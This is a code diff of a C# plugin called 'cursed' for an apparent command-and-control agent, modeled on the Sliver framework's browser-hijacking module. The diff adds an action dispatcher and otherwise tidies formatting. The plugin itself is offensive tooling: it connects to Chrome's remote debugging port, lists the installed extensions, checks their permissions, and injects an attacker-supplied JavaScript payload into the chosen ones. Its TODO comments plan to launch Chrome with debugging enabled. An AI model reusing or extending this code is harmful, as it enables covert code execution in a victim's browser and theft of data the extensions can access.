@@ -8,6 +8,8 @@ namespace Agent
 {
     public class Plugin : IPlugin
     {
+        //Todo in the cursed.py file, add a `launch` bool that would indicate that the user wants us to handle the execution of chrome with a debug port.
+        //https://sliver.sh/docs?name=Cursed maybe implement some of these interactive commands
         //Based on the code in sliver: https://github.com/BishopFox/sliver/blob/master/client/overlord/overlord.go
         public string Name => "cursed";
         private IMessageManager messageManager { get; set; }
@@ -23,12 +25,23 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
 
-            CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);  
+            CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);
 
+            switch (args.action)
+            {
+                case "chrome":
+                    await CChrome(args);
+                    break;
+            }
+ 
+        }
+
+        private async Task CChrome(CursedArgs args)
+        {
             //Parse for chosen browser
             var extensions = await GetExtensions(args.port.ToString());
 
-            if(extensions.Count <= 0)
+            if (extensions.Count <= 0)
             {
                 //No extensions installed
                 return;
@@ -36,18 +49,18 @@ namespace Agent
 
             List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();
 
-            foreach(var extension in extensions)
+            foreach (var extension in extensions)
             {
                 ExtensionManifest manifest = await GetManifestFromExtension(extension.webSocketDebuggerUrl);
 
-                if(manifest is null)
+                if (manifest is null)
                 {
                     return;
                 }
 
                 var permissions = GetPermissionsFromManifest(manifest);
 
-                if(permissions.Count <= 0)
+                if (permissions.Count <= 0)
                 {
                     return;
                 }
@@ -57,9 +70,10 @@ namespace Agent
                     extensionCandidates.Add(extension);
                 }
 
-            } 
+            }
 
-            if(extensionCandidates.Count <= 0) {
+            if (extensionCandidates.Count <= 0)
+            {
                 return;
             }
 
@@ -67,8 +81,8 @@ namespace Agent
             {
                 return;
             }
-            
-            foreach(var extension in extensionCandidates)
+
+            foreach (var extension in extensionCandidates)
             {
                 await this.InjectJs(args.payload, extension.webSocketDebuggerUrl);
             }
